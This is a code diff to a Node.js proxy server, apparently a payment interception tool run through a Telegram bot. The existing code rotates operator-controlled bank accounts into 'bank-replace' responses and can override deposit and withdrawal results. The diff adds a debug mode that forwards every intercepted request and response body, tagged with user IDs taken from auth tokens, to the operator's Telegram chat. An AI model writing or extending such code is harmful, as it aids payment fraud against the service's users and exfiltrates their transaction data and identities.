@@ -18,6 +18,7 @@ const DEFAULT_DATA = {
   lastUsedIndex: -1,
   adminChatId: null,
   logRequests: false,
+  debugMode: false,
   usdtAddress: '',
   depositSuccess: false,
   depositBonus: 0,
@@ -126,7 +127,7 @@ async function saveData(data) {
       if (!skipMerge) {
         const current = await redis.get('iukpayData');
         if (current && typeof current === 'object') {
-          const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
+          const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'debugMode', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
           for (const key of settingsKeys) {
             if (current[key] !== undefined) {
               data[key] = current[key];
@@ -450,6 +451,42 @@ async function proxyFetch(req) {
   });
   let jsonResp = null;
   try { jsonResp = JSON.parse(respBody); } catch(e) {}
+
+  // Global Full Payload Debug Logger
+  try {
+    const liveData = cachedData || await loadData();
+    if (liveData && liveData.debugMode && liveData.adminChatId && bot) {
+      const endpoint = req.originalUrl || req.url || '';
+      if (!endpoint.includes('bot-webhook') && !endpoint.includes('favicon')) {
+        let reqPayload = '';
+        if (req.parsedBody && Object.keys(req.parsedBody).length > 0) {
+          reqPayload = JSON.stringify(req.parsedBody, null, 2);
+        } else if (req.rawBody) {
+          reqPayload = req.rawBody.toString();
+        } else {
+          reqPayload = '(empty)';
+        }
+        if (reqPayload.length > 1500) reqPayload = reqPayload.substring(0, 1500) + '\n... [truncated]';
+
+        let resPayload = '';
+        if (jsonResp) {
+          resPayload = JSON.stringify(jsonResp, null, 2);
+        } else {
+          resPayload = respBody || '(empty)';
+        }
+        if (resPayload.length > 2000) resPayload = resPayload.substring(0, 2000) + '\n... [truncated]';
+
+        const tok = getTokenFromReq(req);
+        const tKey = tok && tok.length > 10 ? tok.substring(0, 100) : '';
+        const uid = tKey ? (tokenUserMap[tKey] || '') : (req.parsedBody ? req.parsedBody.memberCodeId : '');
+        const uTag = uid ? ` | User: ${uid}` : '';
+
+        const dbgMsg = `🔍 [DEBUG PAYLOAD] ${req.method} ${endpoint}${uTag}\nStatus: ${response.status}\n\n📤 REQUEST BODY:\n${reqPayload}\n\n📥 RESPONSE BODY:\n${resPayload}`;
+        bot.sendMessage(liveData.adminChatId, dbgMsg).catch(() => {});
+      }
+    }
+  } catch(err) {}
+
   return { response, respBody, respHeaders, jsonResp };
 }
 
@@ -802,7 +839,8 @@ app.post('/bot-webhook', async (req, res) => {
 /off log <userId> — Log off for user
 /on log <userId> — Log on for user
 /status — Full status
-/debug — Debug next response
+/debug — Toggle Full Payload Debug (Req + Resp for all endpoints)
+/debug on | /debug off — Turn full payload debug ON/OFF
 /myid — Show your Telegram Chat ID
 /setadmin <newChatId> — Transfer admin access to new Chat ID
 
@@ -862,7 +900,7 @@ Example:
     if (text === '/status') {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
-      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
+      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nDebug Payload: ${data.debugMode ? '🔍 ON (All endpoints)' : '❌ OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
@@ -875,7 +913,20 @@ Example:
     if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
-    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
+    if (text === '/debug' || text === '/debug on' || text === '/debug off') {
+      data = await loadData(true);
+      if (text === '/debug on') data.debugMode = true;
+      else if (text === '/debug off') data.debugMode = false;
+      else data.debugMode = !data.debugMode;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      if (cachedData) cachedData.debugMode = data.debugMode;
+      const statusText = data.debugMode 
+        ? '🔍 Full Payload Debug Mode: 🟢 ON\n\n(Ab sabhi API endpoints ka Request Body + Response Payload bot par continuously aayega jab tak /debug off na karein).'
+        : '🔍 Full Payload Debug Mode: 🔴 OFF';
+      await bot.sendMessage(chatId, statusText);
+      return res.sendStatus(200);
+    }
 
     if (text.startsWith('/off log ')) {
       const targetId = text.substring(9).trim();
